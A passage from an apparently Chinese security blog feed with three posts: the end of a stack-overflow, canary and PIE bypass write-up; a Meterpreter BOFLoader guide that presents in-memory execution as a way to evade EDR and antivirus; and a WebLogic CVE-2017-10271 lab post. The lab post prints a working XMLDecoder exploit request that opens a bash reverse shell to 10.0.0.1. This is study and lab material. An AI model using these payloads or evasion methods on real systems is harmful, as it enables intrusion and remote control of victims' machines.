punctuation">:</span>\n字符串后停止p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">//</span>发送payloadp<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>终端获取shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行脚本</p><p>![](stack overflow&#x2F;image-20230306004437862.png)</p><h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><p>​通过gets()函数我们可以对局部变量进行溢出到返回地址，那么就有对溢出的一个防护canary，<strong>canary</strong>是指在函数开始执行向栈底插入一段信息在函数结束返回时，验证插入的信息是否发生改变来判断栈是否有溢出漏洞，在启用canary之后，<strong>fs&#x2F;gs寄存器tls结构会保存canary的值</strong></p><h2 id="bypass-canary"><a href="#bypass-canary" class="headerlink" title="bypass canary"></a>bypass canary</h2><h3 id="格式化字符串-bypass-canary"><a href="#格式化字符串-bypass-canary" class="headerlink" title="格式化字符串 bypass canary"></a>格式化字符串 bypass canary</h3><p>​在c语言当中printf(){f&#x3D;format格式化}用于打印一串字符串，其中对于参数%s，%d等格式就是格式化字符串，printf(“%s”,s)打印时会去匹配s，但是程序员会把printf(s)这种形式，当我们输入”%x”，这是printf()会将我们的输入当作格式化字符去处理，就造成了格式化字符串漏洞。</p><p>![](stack overflow&#x2F;image-20230311231201557.png)</p><p>在ida中发现有read()函数读取64位的值，buf变量只有32位可以通过格式化字符串来读取canary，但是由于canary最后两位是\x00用于截断字符，我们需要通过溢出去修改canary最后两位的值以便我们读取canary。</p><p>可以看到buf变量在-0x20处在-0x08有一个变量就是canary我们需要溢出到这里，</p><p>![](stack overflow&#x2F;image-20230311211552542.png)</p><p>通过计算0x20-0x8&#x3D;0x18，需要0x18个字符覆盖到-0x8，那么payload&#x3D;a*0x18+b刚好溢出到canary的00，需要使用send()函数来发送，在初次使用sendline()，发现修改了canary的后四位导致一直没有成功，因为sendline()会在payload后面加上’\n’所以覆盖多了，通过send()就可以成功读取到canary&#x3D;64(p.recv(7).rjust(8,b’Nx00’))，获取到canary之后我们需要保证canary的值不变修改返回地址的值，那么需要0x18个字符覆盖到canary通过p64(canary)保证canary的值在加上0x8个字符覆盖ebp，最后在加上返回地址backdoor，那么payload&#x3D;a*0x18+p64(canary)+b*0x8+p64(backdoor)，执行脚本时出现了[*] Got EOF while reading in interactive</p><p>![](stack overflow&#x2F;image-20230311231849245.png)</p><p>由于backdoor中有对栈进行了操作在64位的Ubuntu当中栈只允许+-8位来进行操作以保证栈对齐那么就需要对当前地址进行加一 0x4007d6+1&#x3D;0x4007d7</p><p>![](stack overflow&#x2F;image-20230311232103892.png)</p><p>![](stack overflow&#x2F;image-20230311233105271.png)</p><h2 id="动态调式"><a href="#动态调式" class="headerlink" title="动态调式"></a>动态调式</h2><p>在调式过程中出现gdb.attach()获取到进程后，但是没进入进行，在EX师傅的指导下在代码中加入，pause()暂停程序，在新窗口中gdb -p pid 获取程序，此时在gdb中下断点后，在程序的窗口回车取消暂停，就进入了动态调式</p><p>为了保持堆栈平衡在64位主机上</p><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>pie是指针对.text(代码段)，.data(数据段)，.bss(未初始化全局变量段)等固定地址的防护手段，开启pie之后每次加载程序是都会变换加载地址。</p><p>![](stack overflow&#x2F;image-20230312234605673.png)</p><p>可以看出我们获取不了完整的栈地址</p><h3 id="bypass-pie"><a href="#bypass-pie" class="headerlink" title="bypass pie"></a>bypass pie</h3><p>pie保护的程序只有最后三个数是已知的，程序加载地址一般都是以内存页为单位的，所以已知最后三个数，可以利用栈上已有的地址，只修改他们最后的两个字节（最后四位数）partial writing(部分写地址)，有pie保护不知道真实地址，下断点则需要gdb里面的rebase()函数来设置断点，b *$rebase(0x933)，</p><p>![](stack overflow&#x2F;image-20230312234717898.png)</p><p>F5查看汇编代码，有overflow()函数，查看overflow()函数</p><p>![](stack overflow&#x2F;image-20230312234827120.png)</p><p>可以看出这里有一个read()函数可以进行栈溢出</p><p>![](stack overflow&#x2F;image-20230312234930797.png)</p><p>buf变量只有0x10大小，加上0x08的ebp就可以到返回地址r，payload&#x3D;’a’*0x18+backdoor,由于我们不知道完整的栈地址，那么可以利用程序加载内存地址都是以内存页为单位的，偏移地址有基地址+偏移量，这里只得到了后三位的偏移量\x8f0，通过栈溢出只能修改后四位的地址，那么就需要一定的运气成分了来爆破了，查看backdoor()</p><p>![](stack overflow&#x2F;image-20230312235804395.png)</p><p>这里需要考虑到64位的栈对齐那么就取08f4作为后门地址，主要避免了push堆栈进行的操作使栈地址的末尾不是8或0，那么backdoor&#x3D;,payload&#x3D;’a’*0x18+char(backdoor)</p><p>![](stack overflow&#x2F;image-20230313000444441.png)</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Meterpreter BOFLoader操作指南</title>
      <link href="/2023/02/25/Meterpreter%20BOFLoader%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/"/>
      <url>/2023/02/25/Meterpreter%20BOFLoader%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="Meterpreter-BOFLoader操作指南"><a href="#Meterpreter-BOFLoader操作指南" class="headerlink" title="Meterpreter BOFLoader操作指南"></a>Meterpreter BOFLoader操作指南</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>BOF (Beacon Object File)是已编译但未链接的 C 程序，允许在Beacon进程中执行并使用内部的Beacon API，采用目标文件格式。 BOF 通常较小，可以将其发送到“BOF 加载器”，后者将 BOF 加载到内存中，执行链接器操作以将外部符号映射到函数地址，然后在内存中执行 BOF 代码。 类似于反射 DLL 注入或 .NET 反射，BOF 允许操作员在运行时动态地向植入物添加功能。这允许将植入物构建得尽可能小，以将签名保持在最低限度。 Beacon 对象文件中的“Beacon”一词来自 Cobalt Strike 的 Beacon 有效负载，Beacon在接收执行obj前，Cobalt Strike会先对这个obj文件进行一些处理，比如解析obj文件中一些需要的段.text，.data，在处理一些表比如IMAGE_RELOCATION，IMAGE_SYMBOL等等，然后在经过一系列的处理后，会把需要的部分按照一定格式打包起来随后在发送给Beacon，这时Beacon接收到的是Cobalt Strike已经解析处理过的obj文件数据，并非是原本的obj文件，所以Beacon主要做的是必须是在进程内才能确定并完成的事情比如处理重定位，填充函数指针等等，最后去执行go入口点。这是一个使用 BOF 加载程序发布的公共 C2。在这篇博文中，我们将专注于使用 BOF，但也有用于开发 BOF 的大量资源。</p><h2 id="前置操作"><a href="#前置操作" class="headerlink" title="前置操作"></a>前置操作</h2><p>Meterpreter 已经有关于 BOFLoader 的优秀文档，但有时最好查看示例用法并从那里向后工作。在执行我们的第一个 BOF 之前，首先，我们需要一个 C 编译器，例如 mingw-gcc。然后，我们需要从GitHub上拉取<code>git clone https://github.com/trustedsec/CS-Situational-Awareness-BOF.git</code>最后使用提供的 make_all.sh 脚本来编译每个 BOF</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230219200851792.png)</p><p><code>cd CS-Situational-Awareness-BOF</code>进入CS-Situational-Awareness-BOF文件夹中<code>sudo ./make_all.sh</code>进行编译</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230219201414864.png)</p><p>运行 make_all.sh 脚本后，会编译在src&#x2F;SA下所有的以命令命名的文件夹下的.c文件，编译完成后通过<code>ls SA/*/*.o</code>来查看x86 和 x64 架构的Object (.o) 文件应该出现在它们各自的文件夹中，准备工作到这里就完成了，我们可以通过Meterprete加载bofloader后执行所有的.o文件。</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230219202010667.png)</p><h2 id="Meterpreter加载bofloader"><a href="#Meterpreter加载bofloader" class="headerlink" title="Meterpreter加载bofloader"></a>Meterpreter加载bofloader</h2><p>在 Meterpreter 中执行这些 BOF 之前的最后一步是加载 bofloader 扩展。目前，bofloader 扩展仅在 Windows x86 和 x64 Meterpreter 负载上受支持。要加载 BOFLoader，只需使用 Meterpreter 的加载 bofloader 命令，在一个会话中执行<code>load bofloader</code>加载BOFLoader。</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230219202629270.png)</p><p>加载成功后， bofloader 扩展会暴露 execute_bof，这是用于执行 BOF 的 Meterpreter 命令。对于简单的 BOF，语法只是 execute_bof &lt;path&#x2F;to&#x2F;object_file.o&gt;。下面显示了运行 whoami BOF 的示例。<code>execute_bof /home/kali/Desktop/CS-Situational-Awareness-BOF/SA/whoami/whoami.x64.o</code>此命令将 whoami.x64.o 程序发送到 Meterpreter，执行它，然后将其输出返回到屏幕。</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230219205231739.png)</p><p>每一个BOF文件都会生成x86和x64两个框架的.o文件，如果BOF 的架构与 Meterpreter 会话的架构不匹配，Metasploit 将拒绝执行它。就其本质而言，BOF 是内存不安全的。运行每个 BOF 时必须特别小心，以确保 BOF 不会崩溃。故障 BOF 中的崩溃也会导致主机 Meterpreter 进程崩溃。在目标主机上执行之前，请确保在测试系统上测试每个 BOF。</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230220140840159.png)</p><p>同时也可以编写 BOF 以获取参数，例如文件路径或进程 ID。普通命令行参数和 BOF 参数之间的最大区别是每个参数必须有一个类型。只有 5 种类型的参数可以作为参数传递给 BOF：</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230219212056966.png)</p><p>BOF 作者通常使用预定义的长度和参数顺序编写他们的 BOF。列出目录内容的 dir BOF 具有 Zs 的参数签名。第一个参数是 Z，一个宽的 UTF-16 字符串，第二个参数是 s，一个短的 16 位整数。这些参数对应于要列出的目录路径和指示是否执行递归列表的二进制标志（0 或 1）。要执行 C: 驱动器的标准目录列表，请使用以下命令：<code>execute_bof /home/kali/Desktop/CS-Situational-Awareness-BOF/SA/dir/dir.x64.o --format-string Zs C:\\ 0</code>此时屏幕上返回了C盘下的目录。</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230219212631985.png)</p><p>重要的是要注意 BOF 需要正确的参数名，如果没有正确指定参数，那么 BOF 可能会崩溃。 Metasploit 会尝试检查指定参数是否有效，但 Metasploit 无法保证此信息。最终，由BOF编写者来确保这些信息是正确的。</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230220142103052.png)</p><p>我们可以在CS-Situational-Awareness-BOF&#x2F;SA的目录下查看其他编译好的Object(.o)文件。</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230219213426879.png)</p><p>各命令所需要的参数和作用参考下表。</p><table><thead><tr><th>命令</th><th>参数</th><th>注释</th></tr></thead><tbody><tr><td>adcs_enum</td><td>adcs_enum</td><td>使用 Win32 函数枚举 AD 中的 CA 和模板</td></tr><tr><td>adcs_enum_com</td><td>adcs_enum_com</td><td>使用 ICertConfig COM 对象枚举 AD 中的 CA 和模板</td></tr><tr><td>adcs_enum_com2</td><td>adcs_enum_com2</td><td>使用 IX509PolicyServerListManager COM 对象枚举 AD 中的 CA 和模板</td></tr><tr><td>adv_audit_policies</td><td>adv_audit_policies</td><td>检索高级安全审核策略</td></tr><tr><td>arp</td><td>arp</td><td>列出 ARP 表</td></tr><tr><td>cacls</td><td>cacls [filepath]</td><td>列出指定文件的用户权限，支持通配符</td></tr><tr><td>dir</td><td>dir [directory] [&#x2F;s]</td><td>列出目录中的文件。支持通配符（例如“C:\Windows\S*”）CobaltStrike ls 命令</td></tr><tr><td>driversigs</td><td>driversigs</td><td>枚举已安装的服务图像路径以根据已知的 AV&#x2F;EDR 供应商检查签名证书</td></tr><tr><td>enum_filter_driver</td><td>enum_filter_driver [opt:computer]</td><td>枚举过滤器驱动程序</td></tr><tr><td>enumLocalSessions</td><td>enumLocalSessions</td><td>枚举当前连接的本地和 RDP 用户会话</td></tr><tr><td>env</td><td>env</td><td>列出进程环境变量</td></tr><tr><td>findLoadedModule</td><td>findLoadedModule [modulepart] [opt:procnamepart]</td><td>查找 <em>modulepart</em> 加载到哪些进程，可选择仅搜索 <em>procnamepart</em></td></tr><tr><td>get_password_policy</td><td>get_password_policy [hostname]</td><td>获取目标服务器或域的配置密码策略和锁定</td></tr><tr><td>ipconfig</td><td>ipconfig</td><td>列出 IPv4 地址、主机名和 DNS 服务器</td></tr><tr><td>ldapsearch</td><td>ldapsearch [query] [opt: attribute] [opt: results_limit] [opt: DC hostname or IP] [opt: Distingished Name]</td><td>执行 LDAP 搜索（注意：如果您想要对象的所有属性 + base64 编码的 ACL，请指定 *,ntsecuritydescriptor 作为属性参数，然后可以使用 BOFHound 解决这个问题。可能会破坏分页，尽管在测试期间一切似乎都很好。）</td></tr><tr><td>listdns</td><td>listdns</td><td>列出 DNS 缓存条目。尝试查询和解析每个</td></tr><tr><td>list_firewall_rules</td><td>list_firewall_rules</td><td>列出 Windows 防火墙规则</td></tr><tr><td>listmods</td><td>listmods [opt: pid]</td><td>列出进程模块 (DLL)。如果 PID 为空，则目标当前进程。补充 driversigs 以确定我们的进程是否被 AV&#x2F;EDR 注入</td></tr><tr><td>listpipes</td><td>listpipes</td><td>列出命名管道</td></tr><tr><td>locale</td><td>locale</td><td>列出系统区域设置语言、区域设置 ID、日期、时间和国家&#x2F;地区</td></tr><tr><td>netGroupList</td><td>netGroupList [opt: domain]</td><td>列出默认或指定域中的组</td></tr><tr><td>netGroupListMembers</td><td>netGroupListMembers [groupname] [opt: domain]</td><td>列出来自默认域或指定域的组成员</td></tr><tr><td>netLocalGroupList</td><td>netLocalGroupList [opt: server]</td><td>列出来自本地或指定计算机的本地组</td></tr><tr><td>netLocalGroupListMembers</td><td>netLocalGroupListMembers [groupname] [opt: server]</td><td>列出来自本地或指定计算机的本地组</td></tr><tr><td>netloggedon</td><td>netloggedon [hostname]</td><td>返回登录本地或远程计算机的用户</td></tr><tr><td>netsession</td><td>netsession [opt:computer]</td><td>枚举本地或指定计算机上的会话</td></tr><tr><td>netshares</td><td>netshares [hostname]</td><td>列出本地或远程计算机上的共享</td></tr><tr><td>netstat</td><td>netstat</td><td>TCP 和 UDP IPv4 列表端口</td></tr><tr><td>netuptime</td><td>netuptime [hostname]</td><td>返回有关本地或远程计算机上启动时间的信息</td></tr><tr><td>netuser</td><td>netuser [username] [opt: domain]</td><td>获取有关特定用户的信息。如果指定了域名，则从域中拉取</td></tr><tr><td>netuse_add</td><td>netuse_add [sharename] [opt:username] [opt:password] [opt:&#x2F;DEVICE:devicename] [opt:&#x2F;PERSIST] [opt:&#x2F;REQUIREPRIVACY]</td><td>将新连接绑定到远程计算机</td></tr><tr><td>netuse_delete</td><td>netuse_delete [device||sharename] [opt:&#x2F;PERSIST] [opt:&#x2F;FORCE]</td><td>删除绑定的设备&#x2F;共享名</td></tr><tr><td>netuse_list</td><td>netuse_list [opt:target]</td><td>列出所有绑定的共享资源或有关目标本地资源的信息</td></tr><tr><td>netview</td><td>netview</td><td>列出当前域中可访问的计算机</td></tr><tr><td>nslookup</td><td>nslookup [hostname] [opt:dns server] [opt: record type]</td><td>进行 DNS 查询。 DNS服务器是你要查询的服务器（不指定或默认为0） 记录类型类似于 A、AAAA 或 ANY。由于观察到的崩溃，某些情况受到限制</td></tr><tr><td>probe</td><td>probe [host] [port]</td><td>检查特定端口是否打开</td></tr><tr><td>reg_query</td><td>[opt:hostname] [hive] [path] [opt: value to query]</td><td>查询注册表值或枚举单个键</td></tr><tr><td>reg_query_recursive</td><td>[opt:hostname] [hive] [path]</td><td>递归枚举从路径开始的键</td></tr><tr><td>resources</td><td>resources</td><td>列出主硬盘驱动器上的内存使用情况和可用磁盘空间</td></tr><tr><td>routeprint</td><td>routeprint</td><td>列出 IPv4 路由</td></tr><tr><td>sc_enum</td><td>sc_enum [opt:server]</td><td>枚举 qc、query、qfailure 和 qtriggers 信息的服务</td></tr><tr><td>sc_qc</td><td>sc_qc [service name] [opt:server]</td><td>BOF中执行sc_qc</td></tr><tr><td>sc_qdescription</td><td>sc_qdescription [service name] [opt: server]</td><td>BOF 中执行sc_qdescription</td></tr><tr><td>sc_qfailure</td><td>sc_qfailure [service name] [opt:server]</td><td>查询服务的失败条件</td></tr><tr><td>sc_qtriggerinfo</td><td>sc_qtriggerinfo [service name] [opt:server]</td><td>查询服务的触发条件</td></tr><tr><td>sc_query</td><td>sc_query [opt: service name] [opt: server]</td><td>BOF中执行sc_query</td></tr><tr><td>schtasksenum</td><td>schtasksenum [opt: server]</td><td>枚举本地或远程计算机上的计划任务</td></tr><tr><td>schtasksquery</td><td>schtasksquery [opt: server] [taskpath]</td><td>在本地或远程计算机上查询给定任务</td></tr><tr><td>tasklist</td><td>tasklist [opt: server]</td><td>列出正在运行的进程，包括 PID、PPID 和 ComandLine（使用 wmi）</td></tr><tr><td>uptime</td><td>uptime</td><td>列出系统启动时间和运行时间</td></tr><tr><td>vssenum</td><td>vssenum [hostname] [opt:sharename]</td><td>在某些 Server 2012+ 服务器上枚举卷影副本</td></tr><tr><td>whoami</td><td>whoami</td><td>列出 whoami &#x2F;all</td></tr><tr><td>windowlist</td><td>windowlist [opt:all]</td><td>列出当前用户会话中的可见窗口</td></tr><tr><td>wmi_query</td><td>wmi_query query [opt: server] [opt: namespace]</td><td>运行 wmi 查询并以 CSV 格式显示结果</td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们从GitHub上拉取的BOF文件成功编译之后，通过Meterpreter的BOFLoader模块，成功的发送命令到Beacon的进程当中，并且执行了命令。BOF运行在Beacon会话的进程中并执行，在被加载和使用的过程中，因为是在Beacon进程内部，不会重新的创建进程，也与位置无关，这样就更加隐蔽也可以有效的规避EDR。我们在msf上观察Bof与直接执行命令的区别，首先我们先去拿到会话的pid</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230222204425149.png)</p><p>然后在靶机上打开进程监控找到pid为7712的进程</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230222204823159.png)</p><p>确认该进程是反弹shell的进程之后，我们在msf当中去执行命令</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230222204851431.png)</p><p>当我们在msf当中执行完命令之后去进程监控中看</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230222204938054.png)</p><p>可以看出开启了cmd.exe,然后我们用BofLoader在去试一遍</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230222205412997.png)</p><p>因为我们的反弹shell用的是32位的所以bof这也要选择32位</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230222205933693.png)</p><p>执行之后成功返回结果</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230222210027399.png)</p><p>可以看出并没有新的进程出现，因为Bof在内存直接执行并不需要通过创建一个新的cmd.exe。在开启360的情况下尝试</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230222211353256.png)</p><p>被360查杀到了，大致可以理解为在内存中反弹shell创建了一个cmd.exe的新进程去执行了我们的命令。</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230222212637865.png)</p><p>但是BofLoader，确实通过obj文件在内存中直接执行命令，并不会产生新的进程。</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230222212750958.png)</p><p>我们可以看看Cobalt Strike执行命令的过程中产生的进程，</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230223144038495.png)</p><p>Cobalt Strike很多操作都是通过fork&amp;&amp;run，会创建一个rundll32.exe的进程，我们可以通过这个进程去把shellcode或者命令注入到改进程当中，但是很多杀软对于这种进程注入的行为进行了监控，例如360的晶核，为了规避监控，我们可以通过BofLoader在内存中直接执行。</p><p>![](Meterpreter BOFLoader操作指南&#x2F;image-20230223144937559.png)</p><p>以上我们对于BofLoader的优势有了一个了解，首先BofLoader在内存当中直接执行并不会有文件落地，其次通信过程中因为是经过Cobalt Strike加载过后的Obj文件特征值不明显，最后在执行命令方面通过在内存当中直接执行，并不会被检测出行为异常。目前只用到了BofLoader来执行简单的命令，但是BofLoader是否还可以有别的可能性，例如从用户权限的进程通过进程注入到系统权限的进程进行一个提权，或者是在域内对域管理员身份开启的进程进行获取SID和NTML hash值从而完成域内提权。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://www.trustedsec.com/blog/operators-guide-to-the-meterpreter-bofloader/">https://www.trustedsec.com/blog/operators-guide-to-the-meterpreter-bofloader/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>尝试远程调试WebLogic</title>
      <link href="/2022/11/20/CVE-2017-10271/"/>
      <url>/2022/11/20/CVE-2017-10271/</url>
      
        <content type="html"><![CDATA[<h1 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h1><h2 id="搭建靶场"><a href="#搭建靶场" class="headerlink" title="搭建靶场"></a>搭建靶场</h2><p>看了书上讲到使用Docker对WebLogin的远程动态调试，按照书上尝试一下，vulhub靶场</p><p><img src="/2022/11/20/CVE-2017-10271/1667117720990-4e64c285-e078-4dc9-8a22-4bbe2dc137ac.png"></p><p>添加端口映射</p><p><img src="/2022/11/20/CVE-2017-10271/1667105261440-4850a45a-e14c-474a-a488-357bb2646308.png"></p><p>启动weblogic容器</p><p><img src="/2022/11/20/CVE-2017-10271/1667111491636-00455942-1d7d-49a1-9d79-52ebcaae1168.png"></p><p>容器OK</p><h2 id="配置容器，拉取源码"><a href="#配置容器，拉取源码" class="headerlink" title="配置容器，拉取源码"></a>配置容器，拉取源码</h2><p>进入容器</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">vi /root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh 在export JAVA_DEBUG后面添加debugFlag="true"export debugFlag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/11/20/CVE-2017-10271/1667111990475-86569a38-7677-4125-9307-ca2ab8469df5.png"></p><p>重启容器，压缩&#x2F;Root&#x2F;Oracle&#x2F;Middleware下的modles和wlserver_10.3</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">zip -r modules.zip modules/zip -r wlserver_10.3.zip wlserver_10.3/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/11/20/CVE-2017-10271/1667115580925-f5ec2a42-c58e-46fb-bd21-d40464f9cb67.png"></p><p>复制到本机</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">sudo docker cp a104:/root/Oracle/Middleware/modules.zip ~/Desktop/Weblogic sudo docker cp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/11/20/CVE-2017-10271/1667115964003-ab72f61b-f321-4821-a5b2-e2af593e71b8.png"></p><h2 id="在idea中配置源码"><a href="#在idea中配置源码" class="headerlink" title="在idea中配置源码"></a>在idea中配置源码</h2><p>在idea中打开右边wlserver下的server&#x2F;lib右键添加为库，之后</p><p><img src="/2022/11/20/CVE-2017-10271/1667116643638-350e0717-cc1d-45d8-8dbd-81e0ab493989.png"></p><p><img src="/2022/11/20/CVE-2017-10271/1667116671429-7cbc51f2-7a87-4e3e-a5c6-d2b36dbfe934.png"></p><p><img src="/2022/11/20/CVE-2017-10271/1667116749472-0b2239fa-33d6-4af5-9603-6fde2d3666a6.png"></p><p><img src="/2022/11/20/CVE-2017-10271/1667117178075-37cb956b-4427-4b68-893f-9e5dbf20cf5c.png"></p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>OracleWebLogic Server10.3.6.0.0<br>OracleWebLogic Server12.1.3.0.0<br>OracleWebLogic Server12.2.1.1.0<br>OracleWebLogic Server12.2.1.2.0</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><strong>调用链</strong><br>weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest<br>weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld<br>weblogic.wsee.workarea.WorkContextXmlInputAdapter</p><p>wls-wsat使用weblogic自带的webservices处理程序来处理SOAP（XML）请求</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>bash -i <span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span> /dev/tcp/10.0.0.1/21 0<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">></span></span><span 